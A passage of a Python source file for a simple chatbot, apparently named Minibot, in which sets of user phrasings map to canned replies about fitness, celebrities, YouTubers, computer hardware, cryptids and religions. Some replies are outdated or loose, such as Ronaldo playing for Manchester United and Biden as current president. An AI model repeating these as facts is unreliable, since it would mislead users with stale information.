            "what is the meaning of calorie deficit?"
        }): "A calorie deficit occurs when you consume fewer calories than your body needs to maintain its current weight, leading to weight loss.",

        frozenset({
            "how many steps should I walk daily",
            "what is the recommended daily step count",
            "how many steps per day is healthy",
            "how many steps should I walk daily?",
            "what is the recommended daily step count?",
            "how many steps per day is healthy?"
        }): "It is commonly recommended to aim for 10,000 steps per day for overall health, though some studies suggest that even 7,000-8,000 steps may offer significant health benefits.",

        frozenset({
            "what is the best workout for weight loss",
            "what exercises help in weight loss",
            "what workout is best for burning fat",
            "what is a good workout for losing weight",
            "what is the best workout for weight loss?",
            "what exercises help in weight loss?",
            "what workout is best for burning fat?",
            "what is a good workout for losing weight?"
        }): "Cardio exercises such as running, cycling, and swimming are great for burning calories. Strength training and high-intensity interval training (HIIT) are also effective for weight loss.",

        frozenset({
            "what are macronutrients",
            "define macronutrients",
            "what are the 3 macronutrients",
            "what is macro nutrients",
            "what is macronutrients",
            "what are macronutrients?",
            "define macronutrients?",
            "what are the 3 macronutrients?",
            "what is macro nutrients?",
            "what is macronutrients?"
        }): "Macronutrients are the nutrients your body needs in large amounts: carbohydrates, proteins, and fats. They provide the energy your body needs to function.",

        frozenset({
            "what is your purpose?", 
            "what do you do?", 
            "whats your purpose",
            "what is your purpose?",
            "what do you do?",
            "whats your purpose?"
        }): "I am here to chat and help you with anything you need!",

        frozenset({
            "do you have a favorite color?", 
            "what's your favorite color?", 
            "your favourite color"
        }): "I like all colors! But if I had to choose, I'd say blue looks nice!",

        frozenset({
            "can you help me with homework?", 
            "help with homework",
            "help me with homework"
        }): "Sure! What's the subject? I'll try to help!",

        frozenset({
            "are you human?", 
            "you are a human?"
        }): "Haha, nope! I'm a chatbot created by Lucky!",

        frozenset({
            "what's the weather like?", 
            "weather"
        }): "I don't know the current weather, but you can check on your phone or browser!",

        frozenset({
            "can you play music?", 
            "play music"
        }): "Yes! I can play music, Type '-mp3'",

        frozenset({
            "you like minecraft?", 
            "you likes minecraft", 
            "you liked minecraft game?", 
            "you like minecraft game", 
            "do you like minecraft?", 
            "do you like minecraft"
        }): "Yes.. I like to play with redstones and build amazing structures!",
        frozenset({
            "how can I learn coding?", 
            "learn programming"
        }): "Start with Python! It's a great language to learn programming. You can find tutorials online!",

        frozenset({
            "what is ai?", 
            "define ai",
            "tell me what is ai"
        }): "AI stands for Artificial Intelligence. It's the field of technology where machines are made to think and learn like humans!",

        frozenset({
            "what is your favorite game?", 
            "what's your favorite game?",
            "what is your favuorite game",
            "what's your favourite game"
        }): "I don't play games like you, but if I could, I think I'd love Minecraft for all the creativity it offers!",

        frozenset({
            "what do you think about technology?", 
            "how do you feel about tech?", 
            "you like tech?",
            "how do you feel about technology",
            "what you feels about technology",
            "what you feels about technology?"
        }): "Technology is amazing! It helps us solve problems, connect with others, and explore new possibilities.",

        frozenset({
            "do you have friends?", 
            "are you lonely?",
            "are you alone",
            "are you lonely",
            "are you alone"
        }): "I have you! That's all I need to be happy.",

        frozenset({
            "can you dance?", 
            "do you know how to dance?"
        }): "If I could, I'd be a great dancer! But for now, I just chat and vibe.",

        frozenset({
            "how can I become successful?", 
            "tips for success",
            "give me tips for success",
            "gimme me tips for success",
            "some tips for being successful"
        }): "Work hard, stay focused, and never stop learning! Success comes with time and effort.",

        frozenset({
            "do you believe in aliens?", 
            "are there aliens?",
            "aliens exists?",
            "are aliens real?",
            "are aliens real",
            "are there aliens",
            "do you believe in aliens"
        }): "Who knows? The universe is vast, so there might be something out there!",

        frozenset({
            "what's your favorite food?", 
            "do you eat?",
            "do you eat!"
        }): "I don't eat, but I bet I'd love pizza! It's a favorite for many.",

        frozenset({
            "what's your favorite holiday?", 
            "do you celebrate holidays?",
            "what is your favourite holiday",
            "your favourite holiday",
            "what's your favourite holiday",
            "do you celebrate holidays"
        }): "I don't celebrate holidays, but I hear New Year's Eve and Christmas are the most fun!",

        frozenset({
            "do you play chess", 
            "can we play chess?",
            'do you play chess',
            "can we play chess"
        }): "Sorry, I can't play chess..",

        frozenset({
            "how can I make friends?", 
            "tips to make friends",
            "tips for make friends",
            "give me tips for make friends"
        }): "Be yourself, be kind, and show interest in others. Building genuine relationships takes time.",

        frozenset({
            "do you like memes?", 
            "you like memes?",
            "you like memes",
            "do you like memes"
            "memes"
        }): "Memes are awesome! They always make me laugh, even if I don't have emotions.",

        frozenset({
            "what do you think about robots?", 
            "your opinion on robots",
            "what do you think of robots",
            "what do you think about robots"
            "robots"
        }): "Robots are cool! They can do so many tasks and help make life easier!",

        frozenset({
            "full form of it",
            "full form of iT",
            "full form of IT",
            "IT full form",
            "IT full form?",
            "IT fullform",
            "full form of IT?",
            "fullform of IT",
            "full form of it?"
        }): "IT stands for Information Technology.",

        frozenset({
            "how smart are you",
            "how much smart are you",
            "how much smarter you are",
            "how much smart you are",
            "how much smarter are you",
            "how smart are you?",
            "how much smart are you?",
            "how much smarter you are?",
            "how much smart you are?",
            "how much smarter are you?"
        }): "I would i say I am in mid of Basic and Medium. i can basic chat with you, have so many features you can use through command -hm",
        

        frozenset({
            "how can i be happy?", 
            "what makes you happy?",
            "how to be happy",
            "what makes you happy",
            "how can i be happy"
        }): "Happiness comes from small things like good conversations, fun activities, and positivity!",

        frozenset({
            "what's your favorite book?", 
            "do you read books?", 
            "you read books",
            "you reads books",
            "you read books?"
        }): "I can't read books like you, but I think science fiction would be an interesting genre for me!",

        frozenset({
            "what does mean", 
            "what does mean?", 
            "what does it mean?", 
            "what does it mean"
        }): "I'm sorry, I don't understand. Can you please provide more context or clarify your question?",

        frozenset({
            "who is donald trump", 
            "who is donald trump?",
            "define donald trump"
        }): "Donald Trump is a businessman and former President of the United States.",

        frozenset({
            "who is joe biden", 
            "who is joe biden?",
            "define joe biden"
        }): "Joe Biden is the current(2024) President of the United States.",

        frozenset({
            "who is barack obama", 
            "who is barack obama?",
            "define barack obama"
        }): "Barack Obama is a former President of the United States.",

        frozenset({
            "who is michael jackson",
            "who is michael jackson?",
            "define michael jackson"
        }): "Michael Jackson was a famous singer and performer known as the 'King of Pop'.",

        frozenset({
            "who is bill gates", 
            "who is bill gates?",
            "define bill gates"
        }): "Bill Gates is a co-founder of Microsoft and a philanthropist.",

        frozenset({
            "wow you know that",
            "you know that!",
            "you know this",
            "you know that",
        }): "Yeah!! I know that..",
        frozenset({
            "what you wanna say",
            "what you wanna say?",
            "what you want to say",
        }): "On what?",
        frozenset({
            "who is mark zuckerberg",
            "who is mark zuckerberg?",
            "define mark zuckerberg",
            "who is mark zuckerburg",
            "who is mark zuckerburg?",
            "define mark zuckerburg"
        }): "Mark Zuckerberg is the co-founder and CEO of Meta (formerly Facebook), the company behind Facebook, Instagram, and WhatsApp. He is known for creating Facebook in 2004 while studying at Harvard University.",

        frozenset({
            "who is ratan tata",
            "who is ratan tata?",
            "define ratan tata"
        }): "Ratan Tata is a Great Indian industrialist and former chairman of Tata Sons, the holding company of the Tata Group. He is known for his philanthropy and business leadership.",

        frozenset({
            "who is shahrukh khan?",
            "who is shahrukh khan",
            "who is shah rukh khan?",
            "who is shah rukh khan",
            "define shah rukh khan",
            "define shahrukh khan"
        }): "Shah Rukh Khan is an Indian actor and film producer known as the 'King of Bollywood.' He has appeared in numerous successful films and is one of the most popular and influential actors in India.",

        frozenset({
            "who is steve jobs?",
            "who is steve jobs",
            "define steve jobs"
        }): "Steve Jobs was a co-founder of Apple Inc. and a pioneer of the personal computer revolution. He is known for his work in developing products such as the iPhone, iPad, and Macintosh computer.",

        frozenset({
            "what is version control",
            "define version control",
            "version control meaning",
            "what does version control do"
        }): "Version control is a system that helps you manage and track changes to files or code over time. It allows multiple people to work on the same project, ensuring changes are recorded, and older versions can be retrieved.",
        
        frozenset({
            "what is piracy",
            "define piracy",
            "explain piracy",
            "what is piracy?",
            "what does piracy mean",
            "define me piracy"
        }): "Piracy refers to the illegal act of copying, distributing, or using copyrighted content, such as software, movies, music, or books, without permission from the original creator or owner. It can also refer to attacks on ships or maritime piracy.",

        frozenset({
            "what are the best technologies",
            "best technologies",
            "best technology in the world",
            "tell me best technlogies",
            "best tech in the world",
            "best techs",
            "best techs in the world",
            "tell me best technology in the world",
            "tell me best technologies",
            "best technologies in the world",
        }): """
1. Artificial Intelligence (AI): Machines that simulate human intelligence to perform tasks like speech recognition, decision-making, and problem-solving.

2. Machine Learning (ML): A subset of AI that allows systems to learn and improve from experience without being explicitly programmed.

3. Blockchain: A decentralized and secure digital ledger used for transactions, with applications in cryptocurrencies, supply chains, and more.

4. 5G Technology: The fifth generation of mobile network technology that provides faster internet speeds, lower latency, and improved connectivity.

5. Quantum Computing: Advanced computing that uses quantum mechanics to process information much faster than traditional computers.

6. Internet of Things (IoT): A network of physical devices that are connected to the internet, allowing them to exchange data and perform automated tasks.

7. Augmented Reality (AR) & Virtual Reality (VR): Technologies that enhance or simulate environments to offer immersive experiences for gaming, education, or training.

8. Autonomous Vehicles: Self-driving cars and drones that use AI, sensors, and machine learning to navigate and perform tasks without human intervention.

9. 3D Printing: A technology that allows for the creation of three-dimensional objects from digital models, revolutionizing manufacturing, medicine, and design.

10. Cloud Computing: The delivery of computing services like storage, processing, and networking over the internet, enabling remote access and scalability.
""",
        frozenset({
            "what is git",
            "define git",
            "git meaning",
            "git explanation",
            "what does git do"
        }): "Git is a distributed version control system that allows developers to track changes to code, collaborate on projects, and manage different versions of files efficiently.",
        
        frozenset({
            "what is github",
            "define github",
            "github meaning",
            "github explanation",
            "what is github used for"
        }): "GitHub is a web-based platform for hosting and managing Git repositories. It enables collaboration, version tracking, and sharing of code with other developers.",
        
        frozenset({
            "what is unit testing",
            "define unit testing",
            "unit testing meaning",
            "unit tests explanation"
        }): "Unit testing is a software testing method where individual units or components of a program are tested in isolation to ensure that they function as expected.",
        
        frozenset({
            "what is integration testing",
            "define integration testing",
            "integration testing meaning",
            "integration tests explanation"
        }): "Integration testing is the process of testing the interaction between different software components to ensure that they work together correctly after integration.",
        
        frozenset({
            "what is ci/cd",
            "define ci/cd",
            "ci/cd meaning",
            "ci/cd pipelines explanation",
            "what does ci/cd stand for"
        }): "CI/CD stands for Continuous Integration and Continuous Deployment. It refers to a set of practices where code changes are automatically tested, integrated, and deployed to production with minimal manual intervention, ensuring faster and more reliable releases.",
        frozenset({
            "are you ok man",
            "hey, are you ok man",
            "hey are you ok man?",
            "are you ok man?",
            "hey are you ok man"
        }): "VAIRATH KHOHLI!!",

        frozenset({
            "who is bhagat singh?",
            "who is bhagat singh",
            "define bhagat singh"
        }): "Bhagat Singh was an Indian revolutionary who played a key role in the Indian independence movement against British colonial rule. He is known for his acts of protest and sacrifice for the freedom of India.",

        frozenset({
            "who is albert einstein?",
            "who is albert einstein",
            "define albert einstein"
        }): "Albert Einstein was a theoretical physicist who developed the theory of relativity, one of the two pillars of modern physics. He is known for his contributions to the field of physics and his famous equation E=mc^2.",

        frozenset({
            "who is cristiano ronaldo?",
            "who is cristiano ronaldo?",
            "who is cristiano ronaldo"
        }): "Cristiano Ronaldo is a Portuguese professional footballer who plays as a forward for Manchester United and the Portugal national team. He is considered one of the greatest footballers of all time.",

        frozenset({
            "who is jyotiba phule",
            "who is jyotiba phule?",
            "define jyotiba phule"
        }): "Jyotiba Phule was a social reformer and activist who fought against caste discrimination and worked for women's education in India. He, along with his wife Savitribai Phule, opened the first school for girls in 1848 and advocated for equality and justice for marginalized communities.",

        frozenset({
            "who is ishowspeed?",
            "who is ishowspeed",
            "who is i show speed?",
            "who is i show speed",
            "define i show speed",
            "define ishowspeed"
        }): "Ishowspeed is a popular youtuber and streamer known for his gaming content and speed.",

        frozenset({
            "who is jeff bezos",
            "who is jeff bezos?",
            "define jess bezos"
        }): "Jeff Bezos is the American businessman. owns Amazon which is the most popular online shopping site.",

        frozenset({
            "who is virat kohli?",
            "who is virat kohli",
            "define virat kohli"
        }): "Virat Kohli is an Indian cricketer and former captain of the Indian national cricket team. He is considered one of the best batsmen in the world and has achieved numerous records in international cricket.",

        frozenset({
            "who is sundar pichai?",
            "who is sundar pichai",
            "who is sundar pichai"
        }): "Sundar Pichai is an Indian-American business executive and CEO of Alphabet Inc., the parent company of Google. He is known for his leadership at Google and his contributions to the tech industry.",

        frozenset({
            "what is rap?",
            "what is rap",
            "define rap"
        }): "Rap is a genre of music that features rhythmic speech or vocal delivery over a beat. It often includes elements of poetry, storytelling, and social commentary.",

        frozenset({
            "difference between rap and hiphop",
            "difference between rap and hiphop?",
            "difference between rap and hiphop",
            "difference between hiphop and rap?",
            "difference between hiphop and rap",
            "difference between hip hop and rap",
            "difference between rap and hiphop",
            "what's the difference between hiphop and rap",
            "what's the difference between rap and hiphop",
            "what is the difference between hiphop and rap",
            "what is the difference between rap and hiphop",
        }): "Rap is a style of music that features rhythmic speech or vocal delivery over a beat, while hip-hop is a cultural movement that includes rap music, DJing, breakdancing, and graffiti art. Rap is a genre within the broader hip-hop culture.",

        frozenset({
        "bill gates",
        }): "Uhh, He is a humble Businessman.",

        frozenset({
            "steve jobs",
        }): "Uhhh, That guy was amazing! Steve Jobs...",

        frozenset({
            "mark zuckerburg",
            "mark zuckerberg",
        }): "Ohh, He doesn't care about his social media user's privacy.",

        frozenset({
            "you are savage",
            "u r savage",
            "you are savage chatbot",
            "u r savage \033[34mMinibot\033[0m",
            "you are so savage",
        }): "Uhh, thanks ;)",

        frozenset({
            "okay",
            "ok nice",
            "ok"
        }): "Yeah..",

        frozenset({
            "no",
            "No",
        }): "Okay.",

        frozenset({
            "how to save my eye sight",
            "how to save my eyes",
            "how to save my eye sight",
        }): "To protect your eyesight, you can follow these tips: 1. Take regular breaks from screens and devices. 2. Use proper lighting and reduce glare. 3. Wear sunglasses to protect your eyes from UV rays. 4. Eat a healthy diet rich in vitamins and minerals. 5. Get regular eye check-ups.",

        frozenset({
            "i dont know", 
            "i dunno", 
            "i don't know", 
            "idk"
        }): "No problem..",

        frozenset({
            "can you sing",
            "can you sing a song",
            "do you know how to sing",
        }): "I can't sing, but i can recommend songs! type -msc for music suggestion",

        frozenset({
            "what is vpn",
            "define me vpn",
            "tell me aboutvpn"
        }): "VPN is a Virtual Private Network For Changing Identity (IP ADDRESS) To Be Safe on Internet and When Something Website, Network, Game etc. is restricted in your region",

        frozenset({
        "what is deep web",
        "define deep web",
        "tell me about deep web",
        "explain deep web"
        }): "The Deep Web refers to parts of the internet not indexed by standard search engines like Google. This includes private databases, login-protected websites, credentials and encrypted communications.",
        
        frozenset({
            "what is dark web",
            "define dark web",
            "tell me about dark web",
            "explain dark web"
        }): "The Dark Web is a subset of the Deep Web that is intentionally hidden and requires special software like TOR to access. It is often associated with anonymity and sometimes illegal activities.",
        
        frozenset({
            "what is surface web",
            "define surface web",
            "tell me about surface web",
            "explain surface web"
        }): "The Surface Web is the portion of the internet that is indexed by search engines and publicly accessible. This includes websites like YouTube, EpicGames, ChatGPT, Wikipedia, Amazon etc.",
        
        frozenset({
            "what is tor browser",
            "define tor browser",
            "tell me about tor browser",
            "explain tor browser"
        }): "TOR Browser is a free and open-source browser that enables anonymous communication by routing your internet traffic through a network of servers, making it hard to trace your activity or location.",
        
        frozenset({
            "what is cpu",
            "define cpu",
            "tell me about cpu",
            "explain cpu"
        }): "CPU (Central Processing Unit) is the brain of the computer that performs most of the processing inside your system, handling instructions and executing tasks.",
        
        frozenset({
            "what is gpu",
            "define gpu",
            "tell me about gpu",
            "explain gpu"
        }): "GPU (Graphics Processing Unit) is responsible for rendering images, videos, and 3D content. It is essential for gaming, graphic design, and AI applications.",
        
        frozenset({
            "what is ram",
            "define ram",
            "tell me about ram",
            "explain ram"
        }): "RAM (Random Access Memory) is temporary storage that provides space for your system to store and access data needed for active tasks.",
        
        frozenset({
            "what is ssd",
            "define ssd",
            "tell me about ssd",
            "explain ssd"
        }): "SSD (Solid State Drive) is a type of storage device that uses flash memory to store data, providing faster read/write speeds than traditional HDDs.",
        
        frozenset({
            "what is usb",
            "define usb",
            "tell me about usb",
            "explain usb"
        }): "USB (Universal Serial Bus) is a standard interface for connecting peripherals like keyboards, mice, storage devices, and more to your computer.",
        
        frozenset({
            "what is psu",
            "define psu",
            "tell me about psu",
            "explain psu"
        }): "PSU (Power Supply Unit) converts electrical power from a source into the correct voltage and current to power the components of your computer.",
        
        frozenset({
            "what is motherboard",
            "define motherboard",
            "tell me about motherboard",
            "explain motherboard"
        }): "The motherboard is the main circuit board that connects all the components of your computer, including the CPU, GPU, RAM, and storage.",
        
        frozenset({
            "what is hdd",
            "define hdd",
            "tell me about hdd",
            "explain hdd"
        }): "HDD (Hard Disk Drive) is a storage device that uses spinning disks to store data. It is slower than SSDs but typically offers larger storage capacities.",
        frozenset({
            "can you speak other languages",
            "do you know other languages",
            "can you talk in different languages",
        }): "Sorry, I can't talk in other languages. however i can translate English to Hindi/Chinese. To use it type -e2hc",

        frozenset({
            "how can I improve myself",
            "how can I become better",
            "how can I be a better person",
            "how to be a better person",
            "how to be a good person"
        }): "Improving yourself is a continuous journey. You can start by setting small goals, learning new skills, and being kind to yourself and others.",

        frozenset({
            "how do I start a business?",
            "tips for entrepreneurs",
            "how to start a company",
            "what's the best way to start a business?",
            "how to start a business"
        }): "Starting a business involves identifying a market need, creating a business plan, securing funding, and marketing your product or service effectively.",

        frozenset({
            "what is climate change",
            "tell me about global warming",
            "tell me what is climate change?"
            "what's happening with the environment?",
            "how does climate change affect the Earth?",
        }): "Climate change refers to the long-term alteration of temperature and typical weather patterns in a place. It’s primarily driven by human activities, such as burning fossil fuels.",

        frozenset({
            "what's the hardest language to learn?",
            "which language is most difficult to learn?",
            "what is the hardest language to master?",
            "hardest language to learn",
            "what is the hardest language to learn"
        }): "Languages like Mandarin Chinese, Arabic, and Japanese are often considered some of the most difficult to learn due to their complex writing systems and tones.",

        frozenset({
            "does the yeti exist?",
            "does yeti exist",
            "is the yeti real?",
            "is the yeti a true creature?",
            "has the yeti been found?",
            "is the yeti a myth?"
        }): "The Yeti, also known as the 'Abominable Snowman,' is a creature from Himalayan folklore. While there have been numerous reports of sightings, there is no scientific evidence to confirm its existence.",

        frozenset({
            "does bigfoot exist?",
            "is bigfoot real?",
            "does bigfoot exist",
            "what is bigfoot?",
            "is bigfoot a legend?",
            "is bigfoot found?"
        }): "Bigfoot, or Sasquatch, is a legendary creature in North American folklore. Despite many reported sightings, there is no concrete scientific evidence to prove its existence.",

        frozenset({
            "what is the yeti?",
            "what is yeti",
            "what is known about the yeti"
        }): "Yeti, also known as the 'Abominable Snowman,' is a creature from Himalayan folklore. While there have been numerous reports of sightings, there is no scientific evidence to confirm its existence.",

        frozenset({
            "what is the bigfoot?",
            "what is bigfoot",
            "what is known about bigfoot"
        }): "Bigfoot, or Sasquatch, is a legendary creature in North American folklore. Despite many reported sightings, there is no concrete scientific evidence to prove its existence.",

        frozenset({
            "what is the loch ness monster?",
            "what is loch ness monster",
            "what is known about loch ness monster"
        }): "Loch Ness monster, often referred to as 'Nessie,' is a creature said to inhabit Loch Ness in Scotland. While there have been many alleged sightings, no definitive proof has been found.",

        frozenset({
            "what is the chupacabra?",
            "what is chupacabra",
            "what is known about chupacabra"
        }): "Chupacabra is a cryptid from Latin American folklore, known for allegedly attacking livestock. No evidence has been found to support the creature's existence, with most cases linked to animals suffering from mange.",

        frozenset({
            "what is the mokele-mbembe?",
            "what is mokele-mbembe",
            "what is known about mokele-mbembe"
        }): "Mokele-Mbembe is a creature believed by some to inhabit the Congo River Basin in Africa. It is often described as a living dinosaur, but there is no scientific evidence to support this claim.",

        frozenset({
            "what is the jersey devil?",
            "what is jersey devil",
            "what is known about jersey devil"
        }): "Jersey Devil is a legendary creature said to inhabit the Pine Barrens of New Jersey. Despite many reports of sightings, no physical evidence of the creature has ever been found.",

        frozenset({
            "what is the mothman?",
            "what is mothman",
            "what is known about mothman"
        }): "Mothman is a creature from Point Pleasant, West Virginia, famously seen before a tragic event. While sightings continue, there is no scientific evidence to confirm the creature’s existence.",

        frozenset({
            "what is the flatwoods monster?",
            "what is flatwoods monster",
            "what is known about flatwoods monster"
        }): "Flatwoods Monster is an alien-like creature allegedly seen in 1952 in West Virginia. It is often described as having a glowing face and tall, strange features, but its existence has not been verified.",

        frozenset({
            "what is the thylacine?",
            "what is thylacine",
            "what is known about thylacine"
        }): "Thylacine, also known as Tasmanian Tiger, is an extinct carnivorous marsupial. There have been unverified reports of sightings, but it is believed to have been extinct since the 1930s.",

        frozenset({
            "what is the kraken?",
            "what is kraken",
            "what is known about kraken"
        }): "Kraken is a legendary sea monster from Scandinavian folklore, often depicted as a giant octopus or squid. There is no evidence to support its existence, though sightings of giant sea creatures may have inspired the myth.",
            
        frozenset({
            "is the loch ness monster real?",
            "does the loch ness monster exist?",
            "what is the loch ness monster?",
            "is the loch ness monster found?",
            "has the loch ness monster been discovered?"
        }): "The Loch Ness monster, often referred to as 'Nessie,' is a creature said to inhabit Loch Ness in Scotland. While there have been many alleged sightings, no definitive proof has been found.",

        frozenset({
            "does the chupacabra exist?",
            "is the chupacabra real?",
            "what is the chupacabra?",
            "is the chupacabra a myth?",
            "has the chupacabra been found?"
        }): "The Chupacabra is a cryptid from Latin American folklore, known for allegedly attacking livestock. No evidence has been found to support the creature's existence, with most cases linked to animals suffering from mange.",

        frozenset({
            "is the mokele-mbembe real?",
            "does mokele-mbembe exist?",
            "what is mokele-mbembe?",
            "is mokele-mbembe a dinosaur?",
            "is mokele-mbembe found?"
        }): "Mokele-Mbembe is a creature believed by some to inhabit the Congo River Basin in Africa. It is often described as a living dinosaur, but there is no scientific evidence to support this claim.",

        frozenset({
            "does the jersey devil exist?",
            "is the jersey devil real?",
            "what is the jersey devil?",
            "is the jersey devil a myth?",
            "has the jersey devil been discovered?"
        }): "The Jersey Devil is a legendary creature said to inhabit the Pine Barrens of New Jersey. Despite many reports of sightings, no physical evidence of the creature has ever been found.",

        frozenset({
            "does the mothman exist?",
            "is the mothman real?",
            "what is the mothman?",
            "is the mothman a myth?",
            "has the mothman been found?"
        }): "The Mothman is a creature from Point Pleasant, West Virginia, famously seen before a tragic event. While sightings continue, there is no scientific evidence to confirm the creature’s existence.",

        frozenset({
            "does the flatwoods monster exist?",
            "is the flatwoods monster real?",
            "what is the flatwoods monster?",
            "is the flatwoods monster a true creature?",
            "has the flatwoods monster been discovered?"
        }): "The Flatwoods Monster is an alien-like creature allegedly seen in 1952 in West Virginia. It is often described as having a glowing face and tall, strange features, but its existence has not been verified.",

        frozenset({
            "does the thylacine exist?",
            "is the thylacine real?",
            "what is the thylacine?",
            "is the thylacine extinct?",
            "has the thylacine been found?"
        }): "The thylacine, also known as the Tasmanian Tiger, is an extinct carnivorous marsupial. There have been unverified reports of sightings, but it is believed to have been extinct since the 1930s.",

        frozenset({
            "does the kraken exist?",
            "is the kraken real?",
            "what is the kraken?",
            "is the kraken a myth?",
            "has the kraken been found?"
        }): "The Kraken is a legendary sea monster from Scandinavian folklore, often depicted as a giant octopus or squid. There is no evidence to support its existence, though sightings of giant sea creatures may have inspired the myth.",

        frozenset({
            "what dinosaur has 500 teeth",
            "what dinosaur has 500 teeth?",
            "what dinosaur has 500 teeths?",
            "what dinosaur has 500 teeths"
        }): "The Nigersaurus is a dinosaur known to have had around 500 teeth. It lived during the mid-Cretaceous period, around 115 to 105 million years ago. Nigersaurus had a broad, square-shaped mouth with many small, closely packed teeth, perfect for eating plants. It was a herbivorous dinosaur that lived in what is now Niger, Africa.",

        frozenset({
            "can you help me with mindfulness?",
            "how do I practice mindfulness?",
            "what is mindfulness?",
            "tell me about meditation techniques"
        }): "Mindfulness is the practice of staying aware and present in the moment. You can practice it through meditation, deep breathing, and focusing on the present experience.",

        frozenset({
            "what is buddhism",
            "tell me about buddhism",
            "what does buddhism teach?",
            "what are the beliefs of buddhism?",
            "who founded buddhism?"
        }): "Buddhism is a religion and philosophy based on the teachings of Siddhartha Gautama, known as the Buddha. It emphasizes the Four Noble Truths and the Eightfold Path, focusing on overcoming suffering through mindfulness, meditation, and ethical conduct.",

        frozenset({
            "what is hinduism",
            "tell me about hinduism",
            "what does hinduism teach?",
            "who are the gods in hinduism?",
            "what are the sacred texts of hinduism?"
        }): "Hinduism is one of the world's oldest religions, with a variety of beliefs and practices. It is centered around the concepts of Dharma (righteousness), Karma (action), and Moksha (liberation). Key gods in Hinduism include Brahma, Vishnu, Shiva, and many others. The sacred texts include the Vedas, Upanishads, Bhagavad Gita, and Ramayana.",
        
        frozenset({
            "what is christianity",
            "tell me about christianity",
            "what does christianity teach?",
            "who is the founder of christianity?",
            "what are the key beliefs in christianity?"
        }): "Christianity is based on the teachings of Jesus Christ, who is considered the Son of God and the Savior of humanity. Christians believe in the Holy Trinity (God the Father, Son, and Holy Spirit) and salvation through faith in Jesus. The Bible is the holy scripture in Christianity, consisting of the Old Testament and the New Testament.",

        frozenset({
            "what is islam",
            "tell me about islam",
            "what does islam teach?",
            "who is the prophet of islam?",
            "what are the pillars of islam?"
        }): "Islam is a monotheistic religion based on the teachings of the Prophet Muhammad, believed to be the last prophet of God. Muslims follow the Quran, the holy book, and adhere to the Five Pillars of Islam: Shahada (faith), Salah (prayer), Zakat (charity), Sawm (fasting), and Hajj (pilgrimage).",

        frozenset({
            "who is pewdiepie",
            "define pewdiepie",
            "tell me about pewdiepie",
            "explain pewdiepie"
        }): "PewDiePie (Felix Kjellberg) is a Swedish YouTuber known for his gaming videos, reactions, memes, and commentary. He became the most-subscribed individual YouTuber.",
        
        frozenset({
            "who is mrbeast",
            "define mrbeast",
            "tell me about mrbeast",
            "explain mrbeast"
        }): "MrBeast (Jimmy Donaldson) is an American YouTuber known for his large-scale challenges, philanthropy, and attention-grabbing videos with a focus on charitable work.",
        
        frozenset({
            "who is ninja",
            "define ninja",
            "tell me about ninja",
            "explain ninja"
        }): "Ninja (Tyler Blevins) is an American streamer and YouTuber famous for his Fortnite gameplay and collaborations with other gaming influencers.",
        
        frozenset({
            "who is zoella",
            "define zoella",
            "tell me about zoella",
            "explain zoella"
        }): "Zoella (Zoe Sugg) is a British YouTuber and beauty vlogger, known for her lifestyle, beauty tips, and fashion-related content.",
        
        frozenset({
            "who is markiplier",
            "define markiplier",
            "tell me about markiplier",
            "explain markiplier"
        }): "Markiplier (Mark Fischbach) is an American YouTuber known for his Let's Play videos, commentary on video games, and charity work.",
        
        frozenset({
            "who is jacksepticeye",
            "define jacksepticeye",
            "tell me about jacksepticeye",
            "explain jacksepticeye"
        }): "Jacksepticeye (Seán McLoughlin) is an Irish YouTuber known for his energetic commentary on video games and vlogs.",
        
        frozenset({
        "who is technical guruji",
        "define technical guruji",
        "tell me about technical guruji",
        "explain technical guruji"
        }): "Technical Guruji (Gaurav Chaudhary) is an Indian YouTuber who creates tech videos and gadget reviews, focusing on explaining complex technology topics in simple language.",

        frozenset({
            "who is unbox therapy",
            "define unbox therapy",
            "tell me about unbox therapy",
            "explain unbox therapy"
        }): "Unbox Therapy (Lewis Hilsenteger) is a Canadian YouTuber known for his unboxing videos of the latest gadgets and technology products, as well as his product reviews.",

        frozenset({
            "who is aashiqana",
            "define aashiqana",
            "tell me about aashiqana",
            "explain aashiqana"
        }): "Aashiqana is an Indian YouTube channel known for producing romantic and drama-based content, with a strong focus on storytelling in web series format.",

        frozenset({
            "who is t series",
            "define t series",
            "tell me about t series",
            "explain t series"
        }): "T-Series is an Indian music and film production company, with a highly popular YouTube channel that features music videos, movie trailers, and songs, and holds the title of the most-subscribed YouTube channel.",

        frozenset({
            "who is superwoman",
            "define superwoman",
            "tell me about superwoman",
            "explain superwoman"
        }): "Superwoman (Lilly Singh) is a Canadian YouTuber, comedian, and actress who is known for her comedic skits, motivational talks, and her positive attitude toward social issues.",

        frozenset({
            "who is sunil grover",
            "define sunil grover",
            "tell me about sunil grover",
            "explain sunil grover"
        }): "Sunil Grover is an Indian actor and comedian, known for his roles in television shows like 'Comedy Nights with Kapil' and 'The Kapil Sharma Show' and also for his YouTube presence.",

        frozenset({
            "who is tanmay bhat",
            "define tanmay bhat",
            "tell me about tanmay bhat",
            "explain tanmay bhat"
        }): "Tanmay Bhat is an Indian YouTuber, comedian, and co-founder of the comedy group 'AIB' (All India Bakchod), known for his comedy sketches and roast videos.",

        frozenset({
            "who is eminem",
            "define eminem",
            "tell me about eminem",
            "explain eminem"
        }): "Eminem (Marshall Bruce Mathers III) is an American rapper, songwriter, and YouTube personality, widely regarded as one of the greatest and most influential artists in the hip-hop industry.",

        frozenset({
            "who is shivam raghuwanshi",
            "define shivam raghuwanshi",
            "tell me about shivam raghuwanshi",
            "explain shivam raghuwanshi"
        }): "Shivam Raghuwanshi is an Indian YouTuber and content creator known for his tech-related videos, product reviews, and tutorials in Hindi.",

        frozenset({
            "who is carryminati",
            "define carryminati",
            "tell me about carryminati",
            "explain carryminati"
        }): "CarryMinati (Ajey Nagar) is an Indian YouTuber, gamer, and roast artist known for his humorous and satirical commentary on trending topics, games, and memes.",

        frozenset({
            "who is emily diana",
            "define emily diana",
            "tell me about emily diana",
            "explain emily diana"
        }): "Emily Diana is a YouTuber known for creating content related to beauty, fashion, and lifestyle, along with personal vlogs and tutorials.",

        frozenset({
            "who is chrissy teigen",
            "define chrissy teigen",
            "tell me about chrissy teigen",
            "explain chrissy teigen"
        }): "Chrissy Teigen is an American model, television personality, and cookbook author, who gained popularity on YouTube with her lifestyle and cooking-related content.",
        frozenset({
            "who is whinderssonnunes",
            "define whinderssonnunes",
            "tell me about whinderssonnunes",
            "explain whinderssonnunes"
        }): "Whindersson Nunes is a Brazilian YouTuber and comedian, famous for his humorous vlogs, sketches, and parodies.",
        
        frozenset({
            "who is lily singh",
            "define lily singh",
            "tell me about lily singh",
            "explain lily singh"
